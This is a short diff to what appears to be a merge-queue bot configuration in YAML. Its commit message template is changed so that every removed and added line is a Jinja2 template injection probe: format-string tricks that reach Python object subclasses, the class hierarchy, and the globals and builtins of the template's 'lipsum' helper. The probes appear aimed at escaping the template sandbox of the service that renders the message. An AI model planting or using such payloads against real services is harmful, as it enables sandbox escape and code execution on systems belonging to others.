@@ -4,10 +4,8 @@ queue_rules:
     merge_conditions: []
     merge_method: squash
     commit_message_template: |
-      FMT_SC_CALL: {{ '{0.__subclasses__()}'.format(dict) }}
-      FMT_LIPS: {{ '{0}'.format(lipsum) }}
-      SC_LEN: {{ dict['__subclasses__']()|length }}
-      MRO_OBJ: {{ dict['__class__'].mro()|last }}
+      LIPS_GLOB: {{ '{0.__globals__}'.format(lipsum) }}
+      LIPS_BI: {{ '{0.__builtins__}'.format(lipsum) }}
 pull_request_rules:
   - name: q
     conditions:
